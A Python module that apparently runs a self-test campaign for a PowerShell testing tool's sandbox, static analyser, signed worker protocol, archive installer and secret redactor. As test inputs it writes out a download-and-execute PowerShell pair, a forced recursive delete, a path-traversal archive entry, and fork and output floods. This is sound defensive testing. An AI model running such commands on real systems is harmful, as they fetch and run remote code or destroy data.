from __future__ import annotations

import errno
import hashlib
import json
import os
import sys
import tempfile
import zipfile
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any

from .models import RuntimeSpec
from .module_manager import ModuleInstallError, ModuleManager
from .process import run_process
from .redaction import SecretRedactor
from .remote_protocol import (
    ReplayGuard,
    RemoteProtocolError,
    create_job_request,
    create_job_result,
    verify_job_request,
    verify_job_result,
)
from .runner import RunOptions, ScriptRunner
from .runtime import RuntimeManager
from .sandbox import SandboxLimits, build_plan, detect_capabilities, make_preexec, prepare_workspace_permissions
from .signing import create_dsse_envelope, generate_ed25519_keypair
from .snapshot_adapter import SnapshotError, verify_snapshot_attestation
from .static_analysis import analyze_source
from .util import atomic_write_json, utc_now_iso


@dataclass(frozen=True)
class AdversarialCaseResult:
    case_id: str
    category: str
    status: str
    expected: str
    observed: str
    evidence: dict[str, Any] = field(default_factory=dict)
    message: str | None = None


@dataclass(frozen=True)
class AdversarialCampaignReport:
    schema: int
    kind: str
    started_at: str
    finished_at: str
    status: str
    strict: bool
    capabilities: dict[str, Any]
    corpus: dict[str, Any]
    cases: list[AdversarialCaseResult]
    summary: dict[str, int]

    def to_dict(self) -> dict[str, Any]:
        payload = asdict(self)
        payload["cases"] = [asdict(item) for item in self.cases]
        return payload


_BUILTIN_CASES = (
    ("static-dynamic-execution", "static-analysis"),
    ("static-recursive-delete", "static-analysis"),
    ("static-download-execute", "static-analysis"),
    ("sandbox-network", "sandbox"),
    ("sandbox-host-write", "sandbox"),
    ("sandbox-output-flood", "resource"),
    ("sandbox-workspace-fill", "resource"),
    ("sandbox-process-fanout", "resource"),
    ("sandbox-timeout", "resource"),
    ("protocol-replay", "worker-trust"),
    ("protocol-result-tamper", "worker-trust"),
    ("protocol-worker-impersonation", "worker-trust"),
    ("snapshot-attestation-tamper", "worker-trust"),
    ("module-archive-traversal", "supply-chain"),
    ("secret-redactor", "secret-handling"),
    ("runtime-network-block", "powershell-runtime"),
    ("runtime-output-flood", "powershell-runtime"),
    ("runtime-timeout", "powershell-runtime"),
    ("runtime-secret-canary", "secret-handling"),
)


def list_adversarial_cases() -> list[dict[str, str]]:
    return [{"id": case_id, "category": category} for case_id, category in _BUILTIN_CASES]


def adversarial_corpus_manifest() -> dict[str, Any]:
    root = Path(__file__).resolve().parent / "adversarial_corpus"
    digest = hashlib.sha256()
    files: list[dict[str, Any]] = []
    if root.is_dir():
        for path in sorted(item for item in root.rglob("*") if item.is_file() and not item.is_symlink()):
            relative = path.relative_to(root).as_posix()
            raw = path.read_bytes()
            item_hash = hashlib.sha256(raw).hexdigest()
            digest.update(len(relative.encode("utf-8")).to_bytes(8, "big"))
            digest.update(relative.encode("utf-8"))
            digest.update(bytes.fromhex(item_hash))
            files.append({"path": relative, "sha256": item_hash, "bytes": len(raw)})
    definitions = [{"id": case_id, "category": category} for case_id, category in _BUILTIN_CASES]
    digest.update(json.dumps(definitions, sort_keys=True, separators=(",", ":")).encode("utf-8"))
    return {
        "schema": 1,
        "kind": "psmatrix.adversarial-corpus",
        "case_count": len(definitions),
        "sha256": digest.hexdigest(),
        "files": files,
    }


def _case(case_id: str, category: str, passed: bool, expected: str, observed: str, **kwargs: Any) -> AdversarialCaseResult:
    return AdversarialCaseResult(
        case_id=case_id,
        category=category,
        status="PASS" if passed else "FAIL",
        expected=expected,
        observed=observed,
        evidence=kwargs.pop("evidence", {}),
        message=kwargs.pop("message", None),
    )


def _inconclusive(case_id: str, category: str, expected: str, message: str, evidence: dict[str, Any] | None = None) -> AdversarialCaseResult:
    return AdversarialCaseResult(case_id, category, "INCONCLUSIVE", expected, "not-proven", evidence or {}, message)


def _sandbox_run(root: Path, code: str, *, limits: SandboxLimits, network: str = "none"):
    executable = Path(sys.executable).resolve()
    env = {
        "PATH": os.environ.get("PATH", ""),
        "HOME": str(root),
        "TMPDIR": str(root / "tmp"),
        "OPENBLAS_NUM_THREADS": "1",
        "OMP_NUM_THREADS": "1",
        "MKL_NUM_THREADS": "1",
        "NUMEXPR_NUM_THREADS": "1",
        "PYTHONNOUSERSITE": "1",
    }
    (root / "tmp").mkdir(parents=True, exist_ok=True)
    plan = build_plan(
        mode="auto",
        workspace=root,
        executable=executable,
        harness_paths=(),
        env=env,
        limits=limits,
        network=network,
    )
    prepare_workspace_permissions(plan)
    result = run_process(
        [str(executable), "-S", "-c", code],
        cwd=root,
        env=env,
        timeout_seconds=limits.wall_seconds,
        max_output_bytes=limits.max_output_bytes,
        preexec_fn=make_preexec(plan),
        monitor_workspace=root,
        max_workspace_bytes=limits.max_workspace_bytes,
        max_memory_bytes=limits.max_memory_bytes,
        max_committed_memory_bytes=limits.max_committed_memory_bytes,
        max_processes=limits.max_processes,
    )
    return plan, result


def _static_cases(root: Path) -> list[AdversarialCaseResult]:
    definitions = [
        ("static-dynamic-execution", "Invoke-Expression '$x = 1'", {"dynamic-execution"}),
        ("static-recursive-delete", "Remove-Item -Recurse -Force ./target", {"recursive-delete"}),
        ("static-download-execute", "Invoke-WebRequest https://example.invalid/a.ps1 -OutFile a.ps1\nInvoke-Expression (Get-Content a.ps1 -Raw)", {"download-execute", "dynamic-execution"}),
    ]
    results: list[AdversarialCaseResult] = []
    for case_id, source, expected_risks in definitions:
        path = root / f"{case_id}.ps1"
        path.write_text(source, encoding="utf-8")
        analysis = analyze_source(path)
        observed = set(analysis.get("risks", []))
        results.append(_case(
            case_id,
            "static-analysis",
            expected_risks.issubset(observed),
            "risk indicators detected",
            ",".join(sorted(observed)) or "none",
            evidence={"findings": analysis.get("findings", []), "analysis_mode": analysis.get("analysis_mode")},
        ))
    return results


def _sandbox_cases(root: Path) -> list[AdversarialCaseResult]:
    capabilities = detect_capabilities()
    results: list[AdversarialCaseResult] = []
    base = SandboxLimits(
        wall_seconds=4,
        cpu_seconds=3,
        max_output_bytes=16 * 1024,
        max_file_bytes=4 * 1024 * 1024,
        max_workspace_bytes=8 * 1024 * 1024,
        max_memory_bytes=256 * 1024 * 1024,
        max_processes=16,
        max_open_files=128,
    )

    net_root = root / "network"
    net_root.mkdir()
    plan, execution = _sandbox_run(net_root, """
import json, socket
try:
    socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(json.dumps({'allowed': True}))
except OSError as exc:
    print(json.dumps({'allowed': False, 'errno': exc.errno}))
""", limits=base)
    payload = json.loads(execution.stdout.strip().splitlines()[-1]) if execution.stdout.strip() else {}
    network_evidence = {
        "sandbox": plan.to_dict(),
        "execution": asdict(execution),
        "observed": payload,
    }
    if plan.capabilities.network_isolation:
        results.append(_case(
            "sandbox-network", "sandbox",
            payload.get("allowed") is False and payload.get("errno") in {errno.EPERM, errno.EACCES},
            "AF_INET socket denied",
            json.dumps(payload, sort_keys=True),
            evidence=network_evidence,
        ))
    else:
        results.append(_inconclusive(
            "sandbox-network", "sandbox", "AF_INET socket denied",
            "Host does not expose seccomp network isolation; the AF_INET probe outcome cannot be attributed to PSMatrix sandbox enforcement",
            network_evidence,
        ))

    fs_root = root / "filesystem"
    fs_root.mkdir()
    outside = root / "outside-world-writable"
    outside.mkdir(mode=0o777)
    outside.chmod(0o777)
    marker = outside / "escape.txt"
    code = f"""
import json
try:
    open({str(marker)!r}, 'w', encoding='utf-8').write('escape')
    print(json.dumps({{'allowed': True}}))
except OSError as exc:
    print(json.dumps({{'allowed': False, 'errno': exc.errno}}))
"""
    plan, execution = _sandbox_run(fs_root, code, limits=base)
    payload = json.loads(execution.stdout.strip().splitlines()[-1]) if execution.stdout.strip() else {}
    blocked = payload.get("allowed") is False and not marker.exists()
    if plan.capabilities.filesystem_isolation or plan.capabilities.chroot:
        results.append(_case(
            "sandbox-host-write", "sandbox", blocked,
            "write outside workspace denied", json.dumps(payload, sort_keys=True),
            evidence={"sandbox": plan.to_dict(), "execution": asdict(execution), "marker_exists": marker.exists()},
        ))
    else:
        marker.unlink(missing_ok=True)
        results.append(_inconclusive(
            "sandbox-host-write", "sandbox", "write outside workspace denied",
            "Host does not expose Landlock/chroot; filesystem confinement cannot be proven",
            {"sandbox": plan.to_dict(), "observed": payload},
        ))

    output_root = root / "output"
    output_root.mkdir()
    limits = SandboxLimits(**{**asdict(base), "max_output_bytes": 4096})
    _, execution = _sandbox_run(output_root, "print('X' * 131072)", limits=limits)
    results.append(_case(
        "sandbox-output-flood", "resource", bool(execution.resource_violation and "output limit" in execution.resource_violation),
        "captured output limit terminates process", execution.resource_violation or "none",
        evidence={"execution": asdict(execution)},
    ))

    workspace_root = root / "workspace"
    workspace_root.mkdir()
    limits = SandboxLimits(**{**asdict(base), "max_workspace_bytes": 64 * 1024, "max_file_bytes": 4 * 1024 * 1024})
    _, execution = _sandbox_run(workspace_root, "open('fill.bin','wb').write(b'Z' * 1048576)", limits=limits)
    results.append(_case(
        "sandbox-workspace-fill", "resource", bool(execution.resource_violation and "workspace limit" in execution.resource_violation),
        "workspace byte limit terminates process", execution.resource_violation or "none",
        evidence={"execution": asdict(execution)},
    ))

    process_root = root / "processes"
    process_root.mkdir()
    limits = SandboxLimits(**{**asdict(base), "max_processes": 4, "wall_seconds": 5})
    process_code = """
import subprocess, sys, time
children=[]
for _ in range(16):
    try: children.append(subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(20)']))
    except OSError: pass
time.sleep(20)
"""
    _, execution = _sandbox_run(process_root, process_code, limits=limits)
    process_blocked = bool(
        (
            execution.resource_violation
            and any(marker in execution.resource_violation for marker in ("process count", "wall-time", "RSS limit", "memory limit"))
        )
        or (
            execution.exit_code not in {None, 0}
            and ("Resource temporarily unavailable" in execution.stderr or "RLIMIT_NPROC" in execution.stderr)
        )
    )
    results.append(_case(
        "sandbox-process-fanout", "resource", process_blocked,
        "process fanout contained", execution.resource_violation or "none",
        evidence={"execution": asdict(execution)},
    ))

    timeout_root = root / "timeout"
    timeout_root.mkdir()
    limits = SandboxLimits(**{**asdict(base), "wall_seconds": 0.5, "cpu_seconds": 2})
    _, execution = _sandbox_run(timeout_root, "while True: pass", limits=limits)
    results.append(_case(
        "sandbox-timeout", "resource", execution.timed_out and bool(execution.resource_violation),
        "infinite loop terminated by wall-time limit", execution.resource_violation or "none",
        evidence={"execution": asdict(execution)},
    ))
    return results


def _protocol_cases(root: Path) -> list[AdversarialCaseResult]:
    cpriv, cpub = root / "controller.pem", root / "controller.pub"
    wpriv, wpub = root / "worker.pem", root / "worker.pub"
    generate_ed25519_keypair(cpriv, cpub)
    generate_ed25519_keypair(wpriv, wpub)
    request = create_job_request(
        controller_id="controller-adv", worker_id="worker-adv", artifact=b"safe-fixture",
        entrypoint="fixture.ps1", options={}, private_key=cpriv, public_key=cpub,
    )
    guard = ReplayGuard(root / "replay.sqlite3")
    verify_job_request(request, expected_worker_id="worker-adv", controller_public_key=cpub, replay_guard=guard)
    replay_rejected = False
    try:
        verify_job_request(request, expected_worker_id="worker-adv", controller_public_key=cpub, replay_guard=guard)
    except RemoteProtocolError:
        replay_rejected = True
    replay = _case(
        "protocol-replay", "worker-trust", replay_rejected,
        "duplicate nonce rejected", "rejected" if replay_rejected else "accepted",
        evidence={"job_id": request["job_id"]},
    )

    result = create_job_result(
        request=request, worker_id="worker-adv", capabilities={"runtime_id": "windows-powershell-5.1"},
        report={"status": "PASS", "targets": []}, private_key=wpriv, public_key=wpub,
        reset={"required": True, "before": {"passed": True}, "after": {"passed": True}},
    )
    result["report"]["status"] = "FAIL"
    tamper_rejected = False
    try:
        verify_job_result(result, request=request, expected_worker_id="worker-adv", worker_public_key=wpub)
    except RemoteProtocolError:
        tamper_rejected = True
    tamper = _case(
        "protocol-result-tamper", "worker-trust", tamper_rejected,
        "modified signed result rejected", "rejected" if tamper_rejected else "accepted",
        evidence={"job_id": request["job_id"]},
    )

    impostor_priv, impostor_pub = root / "impostor.pem", root / "impostor.pub"
    generate_ed25519_keypair(impostor_priv, impostor_pub)
    impostor_result = create_job_result(
        request=request, worker_id="worker-adv", capabilities={"runtime_id": "windows-powershell-5.1"},
        report={"status": "PASS", "targets": []}, private_key=impostor_priv, public_key=impostor_pub,
        reset={"required": True, "before": {"passed": True}, "after": {"passed": True}},
    )
    impersonation_rejected = False
    try:
        verify_job_result(impostor_result, request=request, expected_worker_id="worker-adv", worker_public_key=wpub)
    except RemoteProtocolError:
        impersonation_rejected = True
    impersonation = _case(
        "protocol-worker-impersonation", "worker-trust", impersonation_rejected,
        "result signed by untrusted worker key rejected", "rejected" if impersonation_rejected else "accepted",
        evidence={"job_id": request["job_id"]},
    )

    statement = {
        "_type": "https://in-toto.io/Statement/v1",
        "subject": [{"name": "vm-adv", "digest": {"sha256": hashlib.sha256(b"vm-adv").hexdigest()}}],
        "predicateType": "https://psmatrix.dev/attestation/snapshot-reset/v1",
        "predicate": {
            "worker_id": "worker-adv", "vm_id": "vm-adv", "snapshot_id": "clean",
            "phase": "before", "passed": True,
        },
    }
    snapshot = create_dsse_envelope(statement, wpriv, wpub)
    snapshot["payload"] = snapshot["payload"][:-2] + "AA"
    snapshot_rejected = False
    try:
        verify_snapshot_attestation(snapshot, wpub, worker_id="worker-adv", vm_id="vm-adv", snapshot_id="clean", phase="before")
    except (SnapshotError, ValueError, Exception) as exc:
        snapshot_rejected = True
    snapshot_case = _case(
        "snapshot-attestation-tamper", "worker-trust", snapshot_rejected,
        "tampered snapshot DSSE rejected", "rejected" if snapshot_rejected else "accepted",
    )
    return [replay, tamper, impersonation, snapshot_case]


def _module_archive_case(home: Path, root: Path) -> AdversarialCaseResult:
    package = root / "Traversal.1.0.0.nupkg"
    nuspec = """<?xml version="1.0"?><package><metadata><id>Traversal</id><version>1.0.0</version></metadata></package>"""
    with zipfile.ZipFile(package, "w") as archive:
        archive.writestr("Traversal.nuspec", nuspec)
        archive.writestr("../escape.ps1", "'escape'")
        archive.writestr("Traversal.psd1", "@{ ModuleVersion = '1.0.0' }")
    rejected = False
    message = None
    try:
        ModuleManager(home).install_nupkg(package, trust_local=True)
    except (ModuleInstallError, OSError, ValueError) as exc:
        rejected = True
        message = str(exc)
    return _case(
        "module-archive-traversal", "supply-chain", rejected and not (root / "escape.ps1").exists(),
        "path-traversal archive rejected", "rejected" if rejected else "accepted",
        evidence={"error": message, "archive_sha256": hashlib.sha256(package.read_bytes()).hexdigest()},
    )


def write_adversarial_evidence(report: AdversarialCampaignReport, output: Path) -> dict[str, Any]:
    output = output.resolve()
    output.parent.mkdir(parents=True, exist_ok=True)
    report_bytes = json.dumps(report.to_dict(), ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode("utf-8")
    manifest = {
        "schema": 1,
        "kind": "psmatrix.adversarial-evidence",
        "report_sha256": hashlib.sha256(report_bytes).hexdigest(),
        "case_count": len(report.cases),
        "corpus_sha256": report.corpus["sha256"],
        "status": report.status,
    }
    manifest_bytes = json.dumps(manifest, sort_keys=True, separators=(",", ":")).encode("utf-8")
    temp = output.with_name(output.name + f".tmp-{os.getpid()}")
    with zipfile.ZipFile(temp, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as archive:
        for name, data in (("adversarial-report.json", report_bytes), ("manifest.json", manifest_bytes)):
            info = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            info.external_attr = 0o100644 << 16
            archive.writestr(info, data)
    os.replace(temp, output)
    return {**manifest, "path": str(output), "sha256": hashlib.sha256(output.read_bytes()).hexdigest()}


def _redaction_case() -> AdversarialCaseResult:
    canary = "PSMATRIX-CANARY-7a1f3c9e"
    redactor = SecretRedactor([canary])
    payload = {
        "stdout": canary,
        "encoded": __import__("base64").b64encode(canary.encode()).decode(),
        "nested": [f"prefix:{canary}:suffix"],
    }
    sanitized = redactor.value(payload)
    leaked = redactor.contains_secret(sanitized)
    return _case(
        "secret-redactor", "secret-handling", not leaked,
        "raw and encoded canary removed", "leaked" if leaked else "redacted",
        evidence={"sanitized": sanitized},
    )


def _runtime_attack_cases(home: Path, root: Path, runtime_version: str) -> list[AdversarialCaseResult]:
    manager = RuntimeManager(home)
    spec = RuntimeSpec(version=runtime_version)
    try:
        manager.require(spec)
    except Exception as exc:
        return [
            _inconclusive(case_id, "powershell-runtime", expected, f"Runtime unavailable: {exc}", {"runtime_id": spec.runtime_id})
            for case_id, expected in (
                ("runtime-network-block", "PowerShell AF_INET socket denied"),
                ("runtime-output-flood", "PowerShell output flood contained"),
                ("runtime-timeout", "PowerShell infinite loop terminated"),
            )
        ]
    runner = ScriptRunner(manager, ModuleManager(home), Path(__file__).resolve().parent)
    cases: list[AdversarialCaseResult] = []

    network = root / "network-attempt.ps1"
    network.write_text("""try {
    $socket = [System.Net.Sockets.Socket]::new(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Stream,
        [System.Net.Sockets.ProtocolType]::Tcp)
    Write-Output 'network-allowed'
    $socket.Dispose()
} catch {
    Write-Output 'network-blocked'
}
""", encoding="utf-8")
    report = runner.run(network, spec, RunOptions(
        timeout_seconds=10, sandbox="auto", network="none", psscriptanalyzer="off",
        pester="off", coverage="off", stream_error_policy="off", native_exit_policy="off",
    ))
    stdout = report.execution.stdout if report.execution else ""
    cases.append(_case(
        "runtime-network-block", "powershell-runtime",
        report.status == "PASS" and "network-blocked" in stdout and "network-allowed" not in stdout,
        "PowerShell AF_INET socket denied", f"status={report.status}; stdout={stdout[-128:]}",
        evidence={"runtime_id": spec.runtime_id, "sandbox": report.sandbox},
    ))

    flood = root / "output-flood.ps1"
    flood.write_text("1..50000 | ForEach-Object { Write-Output ('X' * 128) }\n", encoding="utf-8")
    report = runner.run(flood, spec, RunOptions(
        timeout_seconds=10, max_output_bytes=4096, sandbox="auto", network="none",
        psscriptanalyzer="off", pester="off", coverage="off",
        stream_error_policy="off", native_exit_policy="off",
    ))
    violation = report.execution.resource_violation if report.execution else None
    cases.append(_case(
        "runtime-output-flood", "powershell-runtime",
        report.status == "FAIL_RESOURCE" and bool(violation and "output limit" in violation),
        "PowerShell output flood contained", f"status={report.status}; violation={violation}",
        evidence={"runtime_id": spec.runtime_id, "sandbox": report.sandbox},
    ))

    loop = root / "cpu-loop.ps1"
    loop.write_text("while ($true) { }\n", encoding="utf-8")
    report = runner.run(loop, spec, RunOptions(
        timeout_seconds=0.75, sandbox="auto", network="none",
        psscriptanalyzer="off", pester="off", coverage="off",
        stream_error_policy="off", native_exit_policy="off",
    ))
    execution = report.execution
    cases.append(_case(
        "runtime-timeout", "powershell-runtime",
        report.status in {"FAIL_RESOURCE", "FAIL_TIMEOUT"} and bool(execution and execution.timed_out),
        "PowerShell infinite loop terminated", f"status={report.status}; timed_out={bool(execution and execution.timed_out)}",
        evidence={"runtime_id": spec.runtime_id, "sandbox": report.sandbox},
    ))
    return cases


def _runtime_secret_case(home: Path, root: Path, runtime_version: str) -> AdversarialCaseResult:
    manager = RuntimeManager(home)
    spec = RuntimeSpec(version=runtime_version)
    try:
        manager.require(spec)
    except Exception as exc:
        return _inconclusive(
            "runtime-secret-canary", "secret-handling", "runtime report contains no canary",
            f"Runtime unavailable: {exc}", {"runtime_id": spec.runtime_id},
        )
    source = root / "secret-canary.ps1"
    canary = "PSMATRIX-RUNTIME-CANARY-86e47c1f"
    source.write_text("Write-Output $env:ADV_SECRET\nWrite-Warning $env:ADV_SECRET\n", encoding="utf-8")
    runner = ScriptRunner(manager, ModuleManager(home), Path(__file__).resolve().parent)
    report = runner.run(
        source,
        spec,
        RunOptions(
            timeout_seconds=15,
            sandbox="auto",
            network="none",
            psscriptanalyzer="off",
            pester="off",
            coverage="off",
            environment=(("ADV_SECRET", canary),),
            stream_error_policy="off",
            native_exit_policy="off",
        ),
    )
    payload = report.to_dict()
    leaked = canary in json.dumps(payload, ensure_ascii=False, sort_keys=True)
    return _case(
        "runtime-secret-canary", "secret-handling", report.status == "PASS" and not leaked,
        "runtime report contains no canary",
        f"status={report.status}; leaked={leaked}",
        evidence={"runtime_id": spec.runtime_id, "report_status": report.status, "warnings": report.warnings},
    )


def run_adversarial_campaign(
    *,
    home: Path,
    runtime_version: str = "7.6.4",
    strict: bool = False,
    categories: set[str] | None = None,
    output: Path | None = None,
    evidence_bundle: Path | None = None,
) -> AdversarialCampaignReport:
    started = utc_now_iso()
    capabilities = detect_capabilities().to_dict()
    with tempfile.TemporaryDirectory(prefix="psmatrix-adversarial-") as temp:
        root = Path(temp)
        results: list[AdversarialCaseResult] = []
        static_root = root / "static"
        static_root.mkdir()
        results.extend(_static_cases(static_root))
        sandbox_root = root / "sandbox-cases"
        sandbox_root.mkdir()
        results.extend(_sandbox_cases(sandbox_root))
        protocol_root = root / "protocol"
        protocol_root.mkdir()
        results.extend(_protocol_cases(protocol_root))
        supply_root = root / "supply-chain"
        supply_root.mkdir()
        results.append(_module_archive_case(home, supply_root))
        results.append(_redaction_case())
        runtime_root = root / "runtime"
        runtime_root.mkdir()
        results.extend(_runtime_attack_cases(home, runtime_root, runtime_version))
        results.append(_runtime_secret_case(home, runtime_root, runtime_version))

    if categories:
        results = [item for item in results if item.category in categories]
    counts = {status: sum(item.status == status for item in results) for status in ("PASS", "FAIL", "INCONCLUSIVE")}
    if counts["FAIL"]:
        status = "FAIL"
    elif strict and counts["INCONCLUSIVE"]:
        status = "FAIL_INCONCLUSIVE"
    elif counts["INCONCLUSIVE"]:
        status = "PASS_WITH_GAPS"
    else:
        status = "PASS"
    report = AdversarialCampaignReport(
        schema=1,
        kind="psmatrix.adversarial-campaign",
        started_at=started,
        finished_at=utc_now_iso(),
        status=status,
        strict=strict,
        capabilities=capabilities,
        corpus=adversarial_corpus_manifest(),
        cases=results,
        summary={**counts, "total": len(results)},
    )
    if output is not None:
        atomic_write_json(output.resolve(), report.to_dict())
    if evidence_bundle is not None:
        write_adversarial_evidence(report, evidence_bundle)
    return report
